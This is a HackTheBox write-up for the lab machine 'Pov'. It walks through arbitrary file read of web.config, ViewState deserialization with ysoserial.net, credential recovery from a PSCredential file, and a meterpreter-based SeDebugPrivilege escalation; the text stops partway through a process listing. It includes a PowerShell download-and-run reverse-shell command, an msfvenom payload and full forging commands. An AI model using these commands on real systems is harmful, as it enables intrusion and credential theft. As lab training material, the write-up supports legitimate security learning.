---
title: "HTB: Pov"
date: 2026-05-10
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "ASP.NET", "ViewState", "Insecure Deserialization", "Credential Discovery", "SeDebugPrivilege", "Process Injection"]
categories: ["Writeups"]
description: "POV is a medium difficulty Windows machine involving subdomain enumeration, arbitrary file read, ASP.NET ViewState deserialization for remote code execution, credential discovery, and privilege escalation through SeDebugPrivilege to obtain SYSTEM access."
os: Windows
difficulty: Easy
status: Complete
---

# 🚩 Box Name: Pov

## 📋 Initial Info
- **Hostname:** `Pov.htb`

POV is a medium rated Windows machine centered around a business style web application. After enumerating the main site a subdomain `dev.pov.htb` is discovered.  The development portal contains a download feature vulnerable to arbitrary file read, which can be used to retrieve sensitive files such as `web.config`. With access to the application secrets stored in the configuration file, the ASP.NET ViewState mechanism is abused to achieve insecure deserialization and gain remote code execution as the user `sfitz`. Further enumeration of the host reveals a writable file containing credentials for another user, `alaading`, allowing movement into a more privileged context. As `alaading`, the machine is escalated by abusing `SeDebugPrivilege` to inject into a privileged process, leading to full SYSTEM-level access.


---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`


```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 18:35 CDT
Nmap scan report for 10.129.230.183
Host is up (0.061s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   61.32 ms 10.10.14.1
2   61.30 ms 10.129.230.183

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.22 seconds
```


From the initial scan, there is only port 80 open. Most likely a web exploit of some sort.

### 🌐 Web Enumeration

#### Port 80
Site: pov.htb
Port:80
Server: IIS 10.0

I first begin by fuzzing the site for directories.

```shell
┌─[split@parrot:~/Documents/HTB/Pov]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://pov.htb/FUZZ                                                  ──(Sun,May10)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

js                      [Status: 301, Size: 141, Words: 9, Lines: 2, Duration: 77ms]
css                     [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 76ms]
img                     [Status: 301, Size: 142, Words: 9, Lines: 2, Duration: 60ms]
:: Progress: [26583/26583] :: Job [1/1] :: 604 req/sec :: Duration: [0:00:44] :: Errors: 1 ::
```


There is nothing interesting initially. After exploring the site and source page I find some credentials and a new domain.


![webpage](/images/pov/webpage.png)


Domain: dev.pov.htb/portfolio

```shell
┌─[split@parrot:~/Documents/HTB/Pov]
└─❯ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://pov.htb/ -H "Host: FUZZ.pov.htb" -fs 12330                                                     ──(Sun,May10)─┘

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 1165ms]
:: Progress: [151265/151265] :: Job [1/1] :: 602 req/sec :: Duration: [0:04:26] :: Errors: 0 ::
```

I confirmed the domain with VHost enumeration.

## Creds
Stephen Fitz
sfitz@pov.htb


![creds](/images/pov/insecure.png)


In the Testimonial section there is a clue about what the exploit could be. Let's keep searching.


---

## ⚡ Exploitation (Initial Access)
### Discovery
- Found an LFI in the Resume Download.

![[CV 1.png|1150]]

Any time there is a download option it is important to check for vulnerabilities. Especially local file inclusions. I initially started Burp-suite to inspect the download functionality.


![Resume](/images/pov/Resume.png)

I downloaded the resume and inspect the Burp Request.


![BurpCV](/images/pov/BurpCV.png)


This request strongly suggests an ASP.NET Web Forms application because of:
`__VIEWSTATE`
`__EVENTVALIDATION`
`__EVENTTARGET`
`__VIEWSTATEGENERATOR`

The vulnerable surface is the `file=cv.pdf` parameter combined with the event trigger:

`__EVENTTARGET=download`

In an LFI such as thiis, the core issue is usually:
- unsanitized filesystem access
- path traversal
- unsafe file inclusion or file streaming
- trust of user-controlled filenames

I'm going to send the `POST` request to repeater to see what interesting files I can find. I'm going to try to see if I can pull `index.aspx`.


![index.aspx](/images/pov/index.aspx.png)


I got a `302 Found` code mentioning `default.aspx` which I will attempt next.


![default.aspx](/images/pov/default.aspx.png)

This works. Now I'm going to see what else I can find.

Common ASP.NET targets:
```shell
web.config
machine.config
Global.asax
App_Data/
bin/
Views/web.config
packages.config
```

I'm going to also check for absolute path access.
```shell
file=C:\Windows\win.ini
```


* `Absolute path access` means the application accepts a **full filesystem path** instead of restricting access to a predefined application directory.


Succeeding is a very strong indicator that the backend is doing something like:

  ```csharp
  var file = Request.Form["file"];
  Response.WriteFile(file);
  ```

  instead of safely constraining access to:

  ```text
  C:\inetpub\wwwroot\app\downloads\
  ```

---

### Relative vs Absolute Paths

#### Relative Path

Relative paths depend on the current directory.

Example:

```http
file=cv.pdf
```

Backend might resolve it as:

```text
C:\inetpub\wwwroot\app\downloads\cv.pdf
```

Traversal payload:

```http
file=../../web.config
```

tries to escape that directory.

---

#### Absolute Path

An absolute path specifies the exact location on disk.

Windows:

```text
C:\Windows\win.ini
```

No traversal is needed because you directly reference the target file.

#### Why This Is Important

* Absolute path acceptance means:

  * there is likely **no path restriction**
  * no allowlist
  * no canonicalization enforcement
  * no base-directory confinement

* This is usually worse than a simple traversal bug because:

  * you do not need `../`
  * filtering traversal sequences becomes irrelevant
  * blacklist protections are bypassed


The application failed to restrict user-controlled file paths to a trusted directory. Instead of resolving files relative to a safe download location, the backend accepted arbitrary absolute filesystem paths supplied by the client. This allowed direct access to sensitive files such as `C:\Windows\win.ini` without requiring traversal sequences.

After making a list of important files to look through I found something interesting in `C:\inetpub\wwwroot\dev\web.config`


![web.config](/images/pov/web.config.png)


The LFI vulnerability exposed the application's web.config file, revealing ASP.NET machine keys used to protect ViewState and other cryptographic operations. Leakage of these keys can enable attackers to forge signed ViewState payloads and potentially achieve remote code execution through ASP.NET deserialization attacks.

ViewState is how ASP.NET keeps track of page data between requests. When a page is loaded, ASP.NET serializes things like form values and control states into a Base64-encoded blob and stores it in hidden `__VIEWSTATE` fields in the page. When the user submits the form or triggers a postback, that data is sent back to the server so the application can restore the page state.


```html
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Mon, 11 May 2026 18:05:14 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```


With this data we can create a new malicious viewstate using [ysoserial.net](https://github.com/pwntester/ysoserial.net).

### Foothold

With this flag we can see examples.

```shell
C:\Users\marlo\Deschain\Desktop\HTB writeups\Pov\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release>.\ysoserial.exe -p ViewState
ysoserial: Incorrect plugin mode/arguments combination
Try 'ysoserial -p ViewState --help' for more information.
Exmaples:

.NET Framework >= 4.5:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"

.NET Framework <= 4.0 (legacy):
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug

.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"

.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```

I'm going to test it out first to see if I can ping myself.

```shell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "ping 10.10.14.221"
```


```shell
C:\Users\marlo\Deschain\Desktop\HTB writeups\Pov\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release>.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "ping 10.10.14.221"
2rmFxKSsF%2F%2BS5W91w%2FMRZOUqykAWsmkewSKn696kE907N2vS7uWONYczS3nW%2BTwAANz7a1NPHConUH%2BxJ%2F9T5KvFlJ3IrP8Y7ymEDuMrH6I17PN9vx7rOHie6npGyimaoT47bt57P9rOOED4S%2BdG7vtPvK8mncIDQwhod9ntVBAY7pf%2BAAnuXuffpmmBBz%2Fm%2FiD%2Fi6qJ8uQbsiOHfsaDsksQDYLjrTSDpU7nA4PXcRE%2F1nNBIWxFsgiW5V%2FN%2BFlQwNFPi8bHaL2pD%2B1IV9WI3rgIwVtuDRjXBvJePa2RUSRreZHQ%2Biwj1SckMGHrsfYbjUNUgi2B%2BS7g1B%2FJ6Jn%2FfCLdJcMw5xQlU4zZZDsxwk9qzhPCTLLLD1cTC5FO8rkln5ynsnfjbA%2F0rETSMDNq%2BvEqqsDSFRR2xCELyGlclZrqGAYgQoHlxdPuBdo0Tvu32jTShhcyVeGyIOZMjFIcNcQm0Sd%2FmclOOAtvxsD03ZYdfTl%2BsSNjoys0d0hLELwrlT2HrUcE%2F72YeV8qoK04BP2l1O2x30%2FSKqZa3wOAe4JZMDnD4zP5HEmDnwlA5sVs%2FEt%2FAYRI%2Ff60Yva1mtcSVFCZdr7PPJyxvBzQdgkpxsX52fKopj0qgZu%2BANyOPrd5k%2FQkrL%2BgaONnhDAEn%2BWiF%2FuWjGan3oNrUeXTpd38de1zGXAtMTBVPsdRyhRITZ9Xb%2BHzDIDicnmqKiYUrxWfWDK6pIiEDX3AzL0p0u3nI46HbGKHzBF07XyHJoXPnv6C8CWalzcHXmh4VVcYxc5o8JPQZAvNKuRmrw6fetU7MLpGnRSlRbM6kqWOlpPaAzbCiKwcMWNNJuidare1VIfLcFazUOFNB3qL%2Fc7alvO861dac8o5VOermEKjYd38gen7dzQ7Yvb5HJP1koZYiuIKIKLmKDlqxpl3Zg9WkAuhQE65oHiGLo2rIkjnUG9HuWL2nEEdqseuolBFJPPdBo7Xh8gmP4MbqOSP8YxR3APbWMULM16K5WNT1wJfx4PxQKVD6d5pC7hJ0HYXeAAc3HuB0THZfQ969voivhPmLA5I2gFgLfLjEdsT8qUYCvliI9FEVw4OPjKLfNfM0UuWJR4R1%2FtrVIUdX%2FXH7X9SILhlhiUooBja65VNEs1Fp9hRJR7OWYy8Jw%2FxMwN5LH0m7qMwRVlde9wIDqswaf%2BM9FeMLO5L3KxNdPS7YQggaiBN0mKRJJp1aSymx%2FYVEatS34mov6YjsTY1x9rPVY65sN1EtGf6WKgqoTFsX2pMOJXUnA0uHl3IcvXEvuP2mNHViGdB992fsnY%3D
```


Now I copied this into Burpsuite and started `tcpdump` to capture the pings. 

![burpping](/images/pov/burpping.png)


As soon as I send it I get a respond from `tcpdump`. I have confirmed that this works! Now I'm going to change the command to a reverse shell instead of pinging myself.


![tcpdump](/images/pov/tcpdump.png)


New Payload

```shell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.221/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.221 -Port 443"
```

There are several ways to do this part but I'm going to keep it simple and use a `Nishang` shell. I'll run this on my windows machine and then execute it in BurpSuite like before.


```shell
C:\Users\marlo\Deschain\Desktop\HTB writeups\Pov\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release>.\ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/contact.aspx"  -c "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.221/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.221 -Port 443"
NBZ88GdqMMDU5SkeZAwKL6Fim6qWY9XozKA6b0ZHH9a9pLcleXk%2B0uTEABPVB8K%2FGKfw8dxsC9tuen7sbqZuEtZYoQfwTPNOFti50GM0JzyJptXcEFK5OCJTG3cH9NiqWqYjNESE%2FNPRXirWKZV1%2F3iOoiQCv4qMwYe2Vz9c2QSmX0ADa8%2F4TANgVaL9NznTKVVaGPaEbTN3CD%2FS%2BkaxQtmTVAc1QvC8KcRvgmLy7Bzg%2FvzPUfrKG5KezhoTvdGkU8pRBNPC%2BeD%2BHDrx3bXacLjlmL8%2BZDoLl7G1It%2BdqpELEGrJ9evAvaW7Aj7pdQGGCQtYzV%2FAfmnTkWFKWydrP%2FQkb8voCash6KbON0uK2ahMWpu%2FrtppzR5nYeOzh2tWHnNCyn1WCnWZNeeyjqqGCUxhUxnorifOThaJPkG6yP92Da%2F43kM9Wlwvz%2FqkYnvh3G851ovrSsE84pcUQbqZBcEZyY4gbNX0LIufY%2FU%2BiRFUn1oqY9GsU5%2B4L83jYsE122soEWe8%2FGw13S9o%2B0FJSxi8bqHFfC7t8kp95Pjhar%2BKvJU0PsOfuQ2CK8SBmki9LCD1ME9Xo7WaepflxMFSxba3ns7Aftk1f%2BRNRrn1lqI1ZJ8oI%2Bpp5xl0Ge%2FLyEdb6mWAlFAQrON3c57IjRhS1hudJyGLAb6pLCLn7jB5QDMdE3wCmI1hDwKIFzFGvMBIHGqGlyLqTBhMytOX6jrUWvI3VD77SEx%2FnJ1QyllF%2BwH3qBawZpb6tXtJDOtNYhICRZWxBoFwLS37Ko1nADkL9fm0a908%2FC88g62thscndHMjQFXitANI1xLRGWzv%2FrkQhHLCC%2B1gJ%2F92BLVXGTR3PR0e74CTQs1gp%2BxZCP%2BMlG3ZfwkisEcb3vIywdRo2vjiSYHiH94zEyQb6NqFDWWjZFky3hNAIlmmw9d4f4RSnHUo%2F9%2BFgFs997ylpTez7%2Buf2Sppz%2BMtVDjXK283LgB3bqwJnWGEEWe%2FLjOXqLXIelr7vgij%2BGT4Nyd%2BqTHR2kwe872nhfUbp20Wk4Hh8AMy7FPf8omg9mJhVm9jSO27G1W4RPHy6jxhgMxPc%2FOn1KTixYPslixsla%2Bjr%2BFDG%2BJkBcptyBTKlu1evSd3XWlSeW4dVjoODlyLnKEM5Mdna2t%2B7J1zKnKu7NPCdY8tvb7n%2BLbTRI2ua7gsG2VQgljRirq6FvrlZLkFOI4LNYGZQgY%2BjFkepum6QTpkaE8GxyXSOLdg0Y5J%2BnjQh28SR588tp%2Fza3t8J%2BbNE5N2WTuOevRr47NQhbIFis3SfCpwypiISC3NlkY0QP5%2BZ%2FDW2HlrMpBqdu%2B91N6nbgJIzMZQbCPP6gHK9jI2GuB6mNtIVEenfdSBsGruyKCw5IhRfW80FpsFyMc4kDEGXw63BhFk7FabPot2aITMSHSeHF5RjNvz0B67ztTnAxM0ZgxbS%2Biso4dOyf6Y8RUZu%2F%2BKYq9C%2BfNtwW8ZCOc6zJLPjMz1ZgL8iIUEWkw%3D
```

Command:
1. I'll first host it in the directory `www` and start a python web server on port 80.
2. I'll also start a netcat listener on port 443.
3. Run it through BurpSuite
4. The Powershell command will Download then execute the `.ps1` script.
5. Shell


![[Images/shell.png]]
![Shell](/images/pov/shell.png)


## 🛡️ Privilege Escalation

I landed as the user `sfitz`.

```shell
PS C:\windows\system32\inetsrv>whoami
pov\sfitz
```


Now to perform some enumeration. I noticed there are two users. We only have permission to our user's directory. I didn't find the `user flag` in the Desktop directory so I'm assuming it's in the user's alaading's Desktop. I started looking through the other directories and this caught my eye.

```shell
PS C:\Users\sfitz> dir


    Directory: C:\Users\sfitz


Mode                LastWriteTime         Length Name                                         
----                -------------         ------ ----                                         
d-r---       10/26/2023   5:02 PM                3D Objects                                   
d-r---       10/26/2023   5:02 PM                Contacts                                     
d-r---        1/11/2024   6:43 AM                Desktop                                      
d-r---       12/25/2023   2:35 PM                Documents                                    
d-r---       10/26/2023   5:02 PM                Downloads                                    
d-r---       10/26/2023   5:02 PM                Favorites                                    
d-r---       10/26/2023   5:02 PM                Links                                        
d-r---       10/26/2023   5:02 PM                Music                                        
d-r---       10/26/2023   5:02 PM                Pictures                                     
d-r---       10/26/2023   5:02 PM                Saved Games                                  
d-r---       10/26/2023   5:02 PM                Searches                                     
d-r---       10/26/2023   5:02 PM                Videos                                       


PS C:\Users\sfitz> dir Documents


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name                                         
----                -------------         ------ ----                                         
-a----       12/25/2023   2:26 PM           1838 connection.xml 
```


This is interesting. I have seen something similar before in the `HackTheBox` Windows machine `Reel`. 

That file is a **PowerShell CLI XML serialized credential object**. It is a PowerShell `SecureString` blob encrypted with Windows DPAPI. The username is stored in plaintext.

After searching through my notes from `Reel` I was able to decipher the password.

```shell
PS C:\Users\sfitz\Documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

PS C:\users\sfitz\documents> $cred = Import-Clixml .\connection.xml
PS C:\users\sfitz\documents> $cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```


**Creds**
`alaading:f8gQ8fynP44ek1m3`

With these credentials I'm going to pivot to `alaading`. An easy way to do it is by using the binary `RunasC`. I downloaded the binary, started a netcat listener on port 9001 and ran it.


```shell
PS C:\users\sfitz\desktop> .\_RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.221:9001
```


![alaading](/images/pov/alaading.png)


I'm going to first collect the user flag.


`Alaading` has the Privilege `SeDebugPrivilege` Enabled.

```shell
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


`SeDebugPrivilege` allows a user or process to inspect and interact with other processes running on the system, including those owned by SYSTEM or other privileged accounts. This privilege is extremely sensitive because it can be abused to access process memory, steal credentials, inject code, or migrate into high-privilege processes. In Windows environments, attackers commonly leverage `SeDebugPrivilege` for privilege escalation and credential dumping using tools like Mimikatz.

In our scenario, the easiest way to exploit this is to start a `meterpreter` shell. Then I will simply find a privileged process and then migrate to it. I should be able to elevate my privileges.

#### Failure 1

Created an executable to run `meterpreter`.

```shell
└─❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.221 LPORT=1337 -f exe -o lol.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: lol.exe
```


I've always thought the intros to msfconsole are cool so I always leave them. I think you can avoid them with `-g` but I don't know why anyone would want to. I set up a listener.

```shell
┌─[split@parrot:~/Documents/HTB/Pov/www]
└─❯ msfconsole                                                                ──(Mon,May11)─┘
Metasploit tip: Bind your reverse shell to a tunnel with set
ReverseListenerBindAddress <tunnel_address> and set
ReverseListenerBindPort <tunnel_port> (e.g., ngrok)


     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v6.4.127-dev                               ]
+ -- --=[ 2,639 exploits - 1,332 auxiliary - 2,153 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 1337
lport => 1337
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> options

Payload options (windows/x64/meterpreter_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process,
                                        none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```


Now I will simply transfer it, run the `multi/handler`, and execute it.


Meterpreter Shell

```shell
(Meterpreter 1)(C:\programdata) > getuid
Server username: POV\alaading
```

I will run the `meterpreter` ps command to see the running processes.

```shell
(Meterpreter 1)(C:\programdata) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User          Path
 ---   ----  ----               ----  -------  ----          ----
 0     0     [System Process]
 4     0     System             x64   0
 8     624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 88    4     Registry           x64   0
 292   4     smss.exe           x64   0
 308   552   dwm.exe            x64   1                      C:\Windows\System32\dwm.exe
 320   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 328   624   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
